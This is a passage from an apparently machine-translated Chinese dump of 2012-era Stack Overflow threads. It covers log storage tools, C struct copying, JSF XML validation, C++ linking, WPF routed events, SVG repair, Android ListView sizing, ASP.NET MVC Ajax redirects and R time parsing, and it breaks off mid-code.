*   [Fluentd：从 PHP 应用程序导入数据](http://docs.fluentd.org/articles/php)

这里有一些关于 MongoDB + Fluentd 的教程。

*   [Fluentd + MongoDB：](http://blog.10gen.com/post/27619817959/fluentd-mongodb-the-easiest-way-to-log-your-data)在 10gen 博客上有效记录数据的最简单方法
*   [Fluentd：将 Apache 日志存储到 MongoDB](http://docs.fluentd.org/articles/apache-to-mongodb)

MongoDB 的问题是当数据量超过内存大小时它开始变慢。此时，您可以切换到其他解决方案，如**Apache Hadoop**或**Cassandra**。如果你有上面提到的分布式日志层，你可以随着你的成长切换到另一个解决方案。本教程介绍如何使用 Fluentd 将日志存储到 HDFS。

*   [Fluentd：Fluentd + HDFS：即时大数据收集](http://docs.fluentd.org/articles/http-to-hdfs)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-01-18T20:54:56.857

响应较晚，但这种情况看起来非常适合：

> Logstash：处理传入日志的 Logstash 的服务器组件
> 
> Elasticsearch：存储所有日志
> 
> Kibana：用于搜索和可视化日志的 Web 界面

您可以使用 Logstash Forwarder 将日志发送到 Logstash。它充当日志转发代理。您可以查看各种格式的日志文件、数据库和消息存储，并将它们发送到 Elasticsearch DB。之后，您使用 Kibana web ui 观看所有内容。不要为此目的使用 SQL/NoSQL 数据库构建自定义解决方案。

> Splunk 是另一种采用类似架构的商业解决方案。

* * *

如果需要超实时性能，请查看基于 Kafka 的解决方案。

* * *

更多信息： [https ://www.digitalocean.com/community/tutorials/how-to-use-logstash-and-kibana-to-centralize-and-visualize-logs-on-ubuntu-14-04](https://www.digitalocean.com/community/tutorials/how-to-use-logstash-and-kibana-to-centralize-and-visualize-logs-on-ubuntu-14-04)

[https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T20:02:36.857

Couchbase 2.0（目前处于开发者预览版，但即将成为 Beta 版）为此提供了高性能选项。在记录的情况下，您将需要非常快的写入速度，而视图和视图查询将为读取/搜索/查询提供灵活性。Couchbase 2.0 还将通过 Elastic Search 集成进行全文搜索。

看看：[www.couchbase.com](http://www.couchbase.com/)

# c - C如何处理结构赋值

> ID：11955135
> 
> 赞同：1
> 
> 时间：2012-08-14T14:57:47.247
> 
> 标签：c, struct, variable-assignment

假设我有一个这样的结构：

```
typedef struct {
    char *str;
    int len;
} INS; 
```

以及该结构的数组。

```
INS *ins[N] = { &item, &item, ... } 
```

当我尝试访问它的元素时，不是作为指针，而是作为结构本身，所有字段都被复制到一个临时的本地位置？

```
for (int i = 0; i < N; i++) {
    INS in = *ins[i];
    // internaly the above line would be like:
    // in.str = ins[i]->str;
    // in.len = ins[i]->len;
} 
```

?

那么当我增加结构字段时，这将是一个更昂贵的分配操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:02:57.767

正确，`in`是*副本*。`*ins[i]`

不要介意你的内存消耗，但你的代码很可能*不正确*：对象`in`在循环体结束时死亡，你所做的任何更改`in`都不会产生持久的影响！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:05:58.127

结构赋值的行为类似于`memcpy`. 是的，更大的结构更昂贵。矛盾的是，您的结构变得越大，就越难以衡量添加另一个字段的额外费用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:06:32.817

是的，结构`value semantics`在 C 中具有。因此，将结构分配给另一个结构将导致按成员复制。请记住，指针仍将指向相同的对象。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:52:52.767

编译器**可能会**优化掉结构的副本，而是直接从数组访问成员以提供使用副本的 C 代码中所需的值，或者可能只复制您使用的单个成员。一个好的编译器会做到这一点。

通过指针存储值可能会干扰这种优化。例如，假设您的例程还有一个指向 int, 的指针`p`。当编译器处理你的代码`INS in = *ins[i]`时，它可能会“思考”这样的事情：“复制`ins[i]`是昂贵的。取而代之的是，我会记住那`in`是一个副本，稍后我会为它获取成员，当他们使用时。” 但是，如果您的代码包含`*p = 3`，这可能会改变`ins[i]`，除非编译器能够推断出`p`不指向`ins[i]`. `restrict`（有一种方法可以帮助编译器使用关键字进行推断。）

总结：表面上看起来很昂贵的操作可能由一个好的编译器有效地实现。看起来便宜的操作可能很昂贵（写入会`*p`破坏大的优化）。通常，您应该编写清楚地表达您的算法的代码并让编译器进行优化。

扩展编译器如何优化它。假设你写：

```
for (int i = 0; i < N; i++) {
    INS in = *ins[i];
    ...
} 
```

其中“...”中的代码访问 in.str 和 in.len，但不访问您添加到 INS 结构的其他 237 个成员中的任何一个。然后编译器可以自由地将这段代码转换为：

```
for (int i = 0; i < N; i++) {
    char *str = *ins[i].str; 
    int len = *ins[i].len;
    ...
} 
```

也就是说，即使您编写了一个语句，表面上复制了所有 INS 结构，但编译器只需要复制实际需要的部分。（实际上，甚至不需要复制那些部分。只需要生成一个程序，获得与直接遵循源代码相同的结果即可。**）**

# java - 将 XML 从 JSF textarea 传递给 Bean

> ID：11955140
> 
> 赞同：0
> 
> 时间：2012-08-14T14:57:57.643
> 
> 标签：java, xml, jsf, tomcat, jsf-2

我需要从textarea传递`XML`字符串。`JSF`问题是它`XML`被编码了，我无法将它传递给验证。我的验证方法如下所示：

```
public boolean validate(String data) {
    Source xmlFile = new StreamSource(data);
    SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    try {
        URL kenexaSchema = getClass().getClassLoader().getResource("KenexaXMLConfiguration.xsd");
        Schema schema = schemaFactory.newSchema(kenexaSchema);
        Validator validator = schema.newValidator();
        validator.validate(xmlFile);
        LOGGER.debug(xmlFile.getSystemId() + " is valid");
        return true;
    } catch (SAXException ex) {
        LOGGER.error(xmlFile.getSystemId() + " is not valid.", ex);
        LOGGER.error("Reason: " + ex.getLocalizedMessage());
        return false;
    } catch (IOException ex) {
        LOGGER.error("IO Exception occurred while validating proivder data.", ex);
        LOGGER.error("Reason: " + ex.getLocalizedMessage());
        return false;
    }
} 
```

输入参数`data`是`XML` `String`. `schemaFactory`调用方法时`newSchema`出现错误：

```
java.net.MalformedURLException: no protocol: %3C?xml%20version=%221.0%22%20encoding=%22UTF-8%22?%3E%0D%0A%3Cxmlresults%3E%0D%0A%20%20%20%20%3Cdata%3E%0D%0A%20%20%20%20%20%20%20%20%3Cid%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Crespondentdata%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctestid%3E22000%3C/testid%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crespondentid%3Ermtest13%3C/respondentid%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctestsessionid%3E5981%3C/testsessionid%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctestinstanceid%3E136485%3C/testinstanceid%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cexample%3E0%3C/example%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstatus_code%3E0%3C/status_code%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstatus_desc%3ECOMPLETED%20SUCCESSFULLY%3C/status_desc%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstart_time%3E14/08/06%2016:22:32%3C/start_time%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cend_time%3E14/08/06%2016:23:42%3C/end_time%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/respondentdata%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cresultdata%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscale%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscalename%3ESocial%3C/scalename%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Craw_score%3E28.00%3C/raw_score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ct-score%3E44%3C/t-score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csten_scrore%3E4%3C/sten_scrore%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctime_taken%3E65686%3C/time_taken%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Citems_attempted%3E80%3C/items_attempted%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfinal_score%3E26%3C/final_score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/scale%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscale%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscalename%3ELeader%3C/scalename%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Craw_score%3E23.00%3C/raw_score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ct-score%3E27%3C/t-score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csten_scrore%3E1%3C/sten_scrore%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctime_taken%3E658654%3C/time_taken%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Citems_attempted%3E80%3C/items_attempted%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfinal_score%3E26%3C/final_score%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/scale%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/resultdata%3E%0D%0A%20%20%20%20%20%20%20%20%3C/id%3E%0D%0A%20%20%20%20%3C/data%3E%0D%0A%3C/xmlresults%3E 
```

是否有某种方法可以传递未编码的`XML`来自`JSF`textArea 的内容？我正在使用`JSF 2.0`，应用程序部署在 Tomcat 6 上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:13:53.693

很抱歉误报。问题不是 JSF textarea，而是这一行：

```
URL kenexaSchema = getClass().getClassLoader().getResource("KenexaXMLConfiguration.xsd"); 
```

我找到了以不同方式获取 XSD 的方法，现在它正在工作。

# c++ - 函数不是 .obj 文件的一部分吗？

> ID：11955144
> 
> 赞同：0
> 
> 时间：2012-08-14T14:58:09.950
> 
> 标签：c++

**根据我正在阅读的书，它说：**
在检查程序语法后，C++ 编译器会创建 .obj 文件。接下来，编译器调用链接器，将 .obj 文件中的程序语句与一些函数（如 printf()）结合起来。

函数不是 .obj 文件的一部分吗？它们不是陈述吗？
链接器是否与术语“静态链接”和“动态链接”有联系？

我知道动态链接是在运行时解决的，但是根据这本书，链接器是在编译时调用的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:07:33.403

您定义的函数`.cpp`存在于相应的`.obj`. 使用但未定义的函数（例如标准库函数，如`printf`）不是其中的一部分。链接器解决与其他`.obj`和库的引用。

*   静态库只是一个集合，`.obj`链接器采用`.obj`提供所需符号的集合并将它们放入可执行文件中；

*   动态库没有放在可执行文件中；可执行文件被标记为引用它们，并在可执行文件启动时找到它们。（至少在它们的主要用途中，它们也可以用于插件，然后在进程要求它们时搜索它们）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:07:12.550

从技术上讲，实际上没有链接器完成的“动态链接”之类的事情。实际上只有在运行时手动绑定到一段代码，这与链接器无关。

例如，在 Windows 下，有几种处理 dll 的方法

1.  最低级别的解决方案是使用[LoadLibrary 或 AfxLoadLibrary](http://msdn.microsoft.com/en-US/library/64tkc9y5%28v=vs.80%29)按名称手动访问函数，将它们转换为适当类型的函数指针。

2.  您可以使用[导入库](http://msdn.microsoft.com/en-us/library/67wc07b9.aspx)。这允许链接器在链接时解析其他 dll 中的函数。所以你可以直接调用dll中的一个函数（即只`Foo()`在客户端代码中说）。但是，这些函数只是上述`LoadLibrary`方法的包装。如果未加载，它们会加载 dll，直接访问该库中的函数指针，然后执行该函数。

# c# - WPF 未从用户控件接收路由事件

> ID：11955146
> 
> 赞同：0
> 
> 时间：2012-08-14T14:58:12.667
> 
> 标签：c#, wpf, user-controls, routed-events

我有一个`UserControl`用作自定义按钮的按钮，但是由于我更改了围绕路由单击事件的命名空间不再起作用。基本上我的命名空间看起来像这样：

`UI`
`UI.Controls`
`UI.Pages`

我有`UI.Controls.CustomButton`一个路由点击事件实现了类似的东西：

```
public static readonly RoutedEvent ClickEvent = EventManager.RegisterRoutedEvent(
     "Click", 
     RoutingStrategy.Bubble, 
     typeof(RoutedEventHandler), 
     typeof(CustomButton));

public event RoutedEventHandler Click
{
     add { AddHandler(ClickEvent, value); }
     remove { RemoveHandler(ClickEvent, value); }
}

private void Border_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
{
     Border_MouseEnter(sender, e);
     RaiseClickEvent();
}

private void RaiseClickEvent()
{
     RoutedEventArgs newEventArgs = new RoutedEventArgs(Button.ClickEvent);
     RaiseEvent(newEventArgs);
} 
```

我正在尝试从`UI.Pages.SomePage`这样的内部使用它：

## XAML

```
<controls:CustomButton Text="New..." Click="NewButton_Click"/> 
```

## C＃

```
public void NewButton_Click(object sender, RoutedEventArgs e)
{
    //do something here
} 
```

当我调试应用程序时，我看到`RaiseEvent`my 内部`UI.Controls.CustomButton`被击中，但`NewButton_Click`my 内部`UI.Pages.SomePage`从未被调用。

当一切都在同一个命名空间中时，这是有效的......我是否遗漏了一些明显的东西？谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-14T15:23:39.590

```
RoutedEventArgs newEventArgs = new RoutedEventArgs(Button.ClickEvent); 
```

应该：

```
RoutedEventArgs newEventArgs = new RoutedEventArgs(CustomButton.ClickEvent); 
```

# svg - 如何从 Raphael SVG 创建独立的 SVG？

> ID：11955147
> 
> 赞同：0
> 
> 时间：2012-08-14T14:58:13.570
> 
> 标签：svg

试图[提取嵌入在 Raphael SVG 中的数据](https://stackoverflow.com/questions/11954091/how-to-extract-data-from-an-embed-raphael-dataset-to-csv)，并通过各种选项破解我的方式来获取数据。目前，我发现似乎是带有数据的 SVG 文件（这基于使用 Firebug 并随着时间线的变化观察数据交换）——并尝试将 SVG 转换为[独立的 SVG](http://www.w3schools.com/svg/svg_example.asp)以确认至少从视觉上看，该文件似乎是我正在查看的图表。

这是 Raphael SVG（或者至少是一个 SVG，我无法转储到我正在使用的 SVG 模板文件中，并且加载时不会出错）：

```
<svg height="67" version="1.1" width="840" xmlns="http://www.w3.org/2000/svg" style="overflow: hidden; position: relative; left: 0px; top: 0px;">
<desc>Created with Raphaël 2.1.0</desc>
<defs>
<rect x="0" y="0" width="840" height="67" r="0" rx="0" ry="0" fill="#ebebeb" stroke="none" style="">
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,1.5L67,1.5Z" stroke-width="1" opacity="1">
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,3.5L67,3.5Z" stroke-width="1" opacity="1">
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,7.5L67,7.5Z" stroke-width="1" opacity="1">
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,15.5L67,15.5Z" stroke-width="1" opacity="1">
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,32.5L67,32.5Z" stroke-width="1" opacity="1">
<path style="opacity: 1;" fill="#aaaaaa" stroke="none" d="M0,67L0,0L0,31L2.310344827586207,34L4.620689655172414,35L6.931034482758621,38L9.241379310344827,39L11.551724137931034,41L13.862068965517242,41L16.17241379310345,41L18.482758620689655,37L20.79310344827586,39L23.103448275862068,40L25.413793103448274,41L27.724137931034484,41L30.03448275862069,45L32.3448275862069,45L34.6551724137931,44L36.96551724137931,41L39.275862068965516,41L41.58620689655172,43L43.89655172413793,43L46.206896551724135,44L48.51724137931034,44L50.82758620689655,41L53.137931034482754,34L55.44...2068965517241,17L785.5172413793103,16L787.8275862068965,17L790.1379310344828,21L792.448275862069,22L794.7586206896551,23L797.0689655172414,21L799.3793103448276,20L801.6896551724137,17L804,12L806.3103448275862,15L808.6206896551724,16L810.9310344827586,17L813.2413793103448,15L815.551724137931,16L817.8620689655172,17L820.1724137931035,17L822.4827586206897,18L824.7931034482758,19L827.1034482758621,19L829.4137931034483,17L831.7241379310344,16L834.0344827586207,16L836.3448275862069,17L838.6551724137931,2L840,67" stroke-width="0" opacity="1" transform="matrix(1,0,0,1,-554.3785,0)">
<path style="opacity: 1;" fill="none" stroke="#666666" d="M0,31L2.310344827586207,34L4.620689655172414,35L6.931034482758621,38L9.241379310344827,39L11.551724137931034,41L13.862068965517242,41L16.17241379310345,41L18.482758620689655,37L20.79310344827586,39L23.103448275862068,40L25.413793103448274,41L27.724137931034484,41L30.03448275862069,45L32.3448275862069,45L34.6551724137931,44L36.96551724137931,41L39.275862068965516,41L41.58620689655172,43L43.89655172413793,43L46.206896551724135,44L48.51724137931034,44L50.82758620689655,41L53.137931034482754,34L55.44827586206...17L783.2068965517241,17L785.5172413793103,16L787.8275862068965,17L790.1379310344828,21L792.448275862069,22L794.7586206896551,23L797.0689655172414,21L799.3793103448276,20L801.6896551724137,17L804,12L806.3103448275862,15L808.6206896551724,16L810.9310344827586,17L813.2413793103448,15L815.551724137931,16L817.8620689655172,17L820.1724137931035,17L822.4827586206897,18L824.7931034482758,19L827.1034482758621,19L829.4137931034483,17L831.7241379310344,16L834.0344827586207,16L836.3448275862069,17L838.6551724137931,2" stroke-width="2" opacity="1" transform="matrix(1,0,0,1,-554.3785,0)">
</svg> 
```

**如何编辑上面的 SVG 以在最新版本的 FireFox 中作为独立的 SVG 文件加载？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:06:42.770

我的 Firefox 显示两个问题：

*   标签内部`ë`不是`<desc>`有效字符。删除字符或整个`<desc>`.
*   大多数使用的标签（`<defs>`, `<rect>`, `<path>`）都没有关闭。只需`>`将末尾的 更改为`/>`.

但是，我怀疑这个 SVG 是否显示了您想要的结果。

```
<svg height="67" version="1.1" width="840" xmlns="http://www.w3.org/2000/svg" style="overflow: hidden; position: relative; left: 0px; top: 0px;">
<defs />
<rect x="0" y="0" width="840" height="67" r="0" rx="0" ry="0" fill="#ebebeb" stroke="none" style="" />
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,1.5L67,1.5Z" stroke-width="1" opacity="1" />
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,3.5L67,3.5Z" stroke-width="1" opacity="1" />
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,7.5L67,7.5Z" stroke-width="1" opacity="1" />
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,15.5L67,15.5Z" stroke-width="1" opacity="1" />
<path style="opacity: 1;" fill="none" stroke="#ffffff" d="M0,32.5L67,32.5Z" stroke-width="1" opacity="1" />
<path style="opacity: 1;" fill="#aaaaaa" stroke="none" d="M0,67L0,0L0,31L2.310344827586207,34L4.620689655172414,35L6.931034482758621,38L9.241379310344827,39L11.551724137931034,41L13.862068965517242,41L16.17241379310345,41L18.482758620689655,37L20.79310344827586,39L23.103448275862068,40L25.413793103448274,41L27.724137931034484,41L30.03448275862069,45L32.3448275862069,45L34.6551724137931,44L36.96551724137931,41L39.275862068965516,41L41.58620689655172,43L43.89655172413793,43L46.206896551724135,44L48.51724137931034,44L50.82758620689655,41L53.137931034482754,34L55.44...2068965517241,17L785.5172413793103,16L787.8275862068965,17L790.1379310344828,21L792.448275862069,22L794.7586206896551,23L797.0689655172414,21L799.3793103448276,20L801.6896551724137,17L804,12L806.3103448275862,15L808.6206896551724,16L810.9310344827586,17L813.2413793103448,15L815.551724137931,16L817.8620689655172,17L820.1724137931035,17L822.4827586206897,18L824.7931034482758,19L827.1034482758621,19L829.4137931034483,17L831.7241379310344,16L834.0344827586207,16L836.3448275862069,17L838.6551724137931,2L840,67" stroke-width="0" opacity="1" transform="matrix(1,0,0,1,-554.3785,0)" />
<path style="opacity: 1;" fill="none" stroke="#666666" d="M0,31L2.310344827586207,34L4.620689655172414,35L6.931034482758621,38L9.241379310344827,39L11.551724137931034,41L13.862068965517242,41L16.17241379310345,41L18.482758620689655,37L20.79310344827586,39L23.103448275862068,40L25.413793103448274,41L27.724137931034484,41L30.03448275862069,45L32.3448275862069,45L34.6551724137931,44L36.96551724137931,41L39.275862068965516,41L41.58620689655172,43L43.89655172413793,43L46.206896551724135,44L48.51724137931034,44L50.82758620689655,41L53.137931034482754,34L55.44827586206...17L783.2068965517241,17L785.5172413793103,16L787.8275862068965,17L790.1379310344828,21L792.448275862069,22L794.7586206896551,23L797.0689655172414,21L799.3793103448276,20L801.6896551724137,17L804,12L806.3103448275862,15L808.6206896551724,16L810.9310344827586,17L813.2413793103448,15L815.551724137931,16L817.8620689655172,17L820.1724137931035,17L822.4827586206897,18L824.7931034482758,19L827.1034482758621,19L829.4137931034483,17L831.7241379310344,16L834.0344827586207,16L836.3448275862069,17L838.6551724137931,2" stroke-width="2" opacity="1" transform="matrix(1,0,0,1,-554.3785,0)" />
</svg> 
```

# java - 如何使用在 tomcat 服务器上运行的现有应用程序配置 jwebsockets

> ID：11955152
> 
> 赞同：3
> 
> 时间：2012-08-14T14:58:29.840
> 
> 标签：java, spring, tomcat, spring-mvc, websocket

我正在尝试将 Jwebsockets 与我现有的项目一起使用。我已经使用我的 Tomcat Apache 服务器完成了配置，并且能够使用运行所有演示应用程序

```
 http://localhost:8080/jWebSocketAppSrvDemo-1.0/ 
```

它运行良好的 Jwebsocket 服务器在我的机器上运行良好。

现在我不知道如何将它与我现有的应用程序集成，如何将消息发送到 jwebsockets 服务器并从服务器接收消息。我是这种技术的新手。我尝试了网站上提到的教程，但我无法像第一个 jWebSocket“Hello World”教程那样做到这一点，我不知道我在哪里设置了 IURL、gUsername、IPPassword。与下一个教程相同，我不知道在哪里可以获得 WebSocketTokenListener 接口。我已将 jWebSocketServer-Bundle-1.0.jar 文件添加到我的 lib 文件夹中。我觉得教程不是一步一步的教程。

如果我想在我的网站上发布和回复一些消息，任何人都可以建议我如何将它与我的应用程序集成。

这是在 java 应用程序中使用 jWebsockets 的权利吗？我在 Ubuntu 上使用带有 Apache Tomcat 的 spring 和 springMVC 框架

# android - 适配器更新后 ListView 内容被截断

> ID：11955157
> 
> 赞同：1
> 
> 时间：2012-08-14T14:58:45.473
> 
> 标签：android, listview, dynamic

我的 UI 中有许多垂直堆叠的面板。每个面板都包含一个 ListView。根据用户交互，ListView 中的项目数得到更新。

我的问题是，如果我增加 ListView 中显示的项目数量，包含面板将不会展开以显示它们。相反，我的 ListView 只是被淡化为黑色而被切断。我正在以编程方式创建这些堆叠面板中的每一个 - 这是创建函数的主体：

```
LinearLayout containingPanel = new LinearLayout(TestActivity.this);
containingPanel.setOrientation(LinearLayout.VERTICAL);

// create title
TextView titleText = new TextView(TestActivity.this);
titleText.setText("a title");
titleText.setGravity(Gravity.CENTER);
titleText.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.WRAP_CONTENT));

// create dynamic list view of costs                
ListView dynamicContentListView = new ListView(TestActivity.this);
dynamicContentListView.setAdapter(new MyDynamicAdapter());
LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.WRAP_CONTENT);
params.weight = 1;
dynamicContentListView.setLayoutParams(params);

// build up GUI

containingPanel.addView(titleText); 

containingPanel.addView(dynamicContentListView);                        
return containingPanel; 
```

我认为在 ListView 上设置权重应该足够了，但事实并非如此。所有 GUI 更新工作正常 - 新项目会自动添加到支持适配器的数据中，并且 ListView 会正确更新自身。但是在我添加了三四个新项目之后，containingPanel 拒绝自我更新，并且新项目被混合掉了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-15T09:40:36.470

试试这个功能。我想，它可能会对你有所帮助。该函数用于`ListView`根据其子级设置高度。

```
public static void setListViewHeightBasedOnChildren(ListView listView) {
        ListAdapter listAdapter = listView.getAdapter();
        if (listAdapter == null) {
            // pre-condition
            return;
        }

        int totalHeight = 0;
        int desiredWidth = MeasureSpec.makeMeasureSpec(listView.getWidth(), MeasureSpec.AT_MOST);
        for (int i = 0; i < listAdapter.getCount(); i++) {
            View listItem = listAdapter.getView(i, null, listView);
            listItem.measure(desiredWidth, MeasureSpec.UNSPECIFIED);
            totalHeight += listItem.getMeasuredHeight();
        }

        ViewGroup.LayoutParams params = listView.getLayoutParams();
        params.height = totalHeight + (listView.getDividerHeight() * (listAdapter.getCount() - 1));
        listView.setLayoutParams(params);
        listView.requestLayout();
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-15T08:15:05.593

（您可以添加 a `ListView`inside a`ScrollView`但并非没有一点工作（因为它们都是 Scrollable 组件 - 操作系统如何知道您要滚动哪个组件？）。您需要`isScrollContainer="false"`在 ListView 上添加。）

```
<ListView
    android:id="@+id/list"
    android:layout_width="match_parent"
    android:layout_height="wrap_contents"
    android:isScrollContainer="false"/> 
```

a 的全部意义`ListView`在于它具有由页面布局决定的设定高度。只有当它的孩子的组合高度超过显示它所需的区域时，它才会变得可滚动。

听起来您真正想要的是更类似于由适配器支持的 LinearLayout 的东西，网络上有几种实现，或者您可以创建自己的。

`ListView`但是，您可以通过将 ListView的高度设置为: 以编程方式动态调整您的大小，从而将 ListView 破解为这种行为`listCount * itemHeight`。这将具有持续扩展您的 ListView 的效果。

您可能会发现，随着您开发 UI 设计，您将不再需要这样的组件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:09:30.903

如果您的列表视图是默认大小，则可能无法将它们放入布局中。您可以尝试将列表视图包装在滚动视图中，然后您可以滚动浏览它们。

# asp.net-mvc - RedirectToAction 完成后视图不刷新

> ID：11955161
> 
> 赞同：8
> 
> 时间：2012-08-14T14:58:52.230
> 
> 标签：asp.net-mvc, redirecttoaction

这是我的问题：

```
[HttpPost]
public ActionResult AddData(CandidateViewModel viewModel)  
{
    var newCandidateId = 0;  
    newCandidateId = this._serviceClient.AddCandidate(viewModel);  
    return  RedirectToAction("DisplayCandidate",new {id=newCandidateId});  
}

public ActionResult DisplayCandidate(int id)
{
    var candidateViewModel= this._serviceClient.GetCandidate(id);
    return View(candidateViewModel);
} 
```

填写表格后 viwemodel 发送到服务器。存储数据后，流被重定向到 DisplayCandidate 操作，它会去那里，但页面没有刷新。我不明白为什么！请帮忙。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-14T21:19:25.047

因为您使用的是 Ajax Post

```
public ActionResult AddData(CandidateViewModel viewModel)  
{
    var newCandidateId = 0;  
    newCandidateId = this._serviceClient.AddCandidate(viewModel); 
    string ReturnURL = "/DisplayCandidate/"+newCandidateId;
    return JSON(ReturnURL);  
} 
```

并在您的 Ajax 发布方法中：

```
Onsuccess(function(retURL){ window.location(retURL); }) 
```

这将采用新的操作，并且该操作将返回视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-10T07:07:37.570

如果您使用的是 Ajax，则返回脚本结果以执行导航

代替

```
return  RedirectToAction("DisplayCandidate",new {id=newCandidateId}); 
```

尝试

```
 var viewName = "/Path/ViewName";
 var id = 1;
 var urlNavigate = string.Format("location.href='{0}?id={1}'", viewName, id);
 return new JavaScriptResult() { Script = urlNavigate }; 
```

# r - 从 R 中的时间数据中剥离秒数

> ID：11955163
> 
> 赞同：2
> 
> 时间：2012-08-14T14:58:59.413
> 
> 标签：r

我有这样的数据

```
y<-c("00:00:10", "00:10:10", "2:10:2") 
```

这些数据采用 H:M:S 格式。我希望能够将此数据转换为总秒数。我喜欢将 H 数据乘以 H*60*60 + M*60 + S 来计算总秒数的值。

我正在这样做：

```
z <- strptime(, "%H") 
```

获得小时值，不工作。有人能插话吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T17:31:16.800

我从来没有掌握处理复杂包裹时间的窍门。这是一个代替它的oneliner。

```
> apply(sweep(sapply(strsplit(y, ":"), as.integer), 1, 60^(2:0), "*"), 2, sum)
[1]   10  610 7802 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:04:20.457

你的工作时间可以超过 24 点吗？如果是这样，我认为您必须将它们视为字符串。`2`同样在您的示例中，第三次的最后一个是什么意思`2:10:2`？那是两秒还是二十秒？

我使用这两个函数来回转换：

```
convertSecToHrMinSec <- function(vec) {
  # takes a vector of seconds
  # returns string formatted as HHH:MM:SS
  vec <- as.integer(vec)
  hr  <- floor(vec / 3600)
  min <- floor((vec - hr * 3600) / 60)
  sec <- vec - min * 60 - hr * 3600
  hr  <- sprintf('%02d', hr)
  min <- sprintf('%02d', min)
  sec <- sprintf('%02d', sec)

  return (paste(hr, min, sec, sep=':'))
}

convertHrMinSecToSec <- function(vec) {
  ## convert hrs:mins:seconds to seconds
  require(stringr)
  require(plyr)
  if (length(grep('.+/.+:.+', vec, perl=TRUE)) >= 1) return(vec)
  if (length(grep('.+:.+:.+', vec, perl=TRUE)) >= 1) {
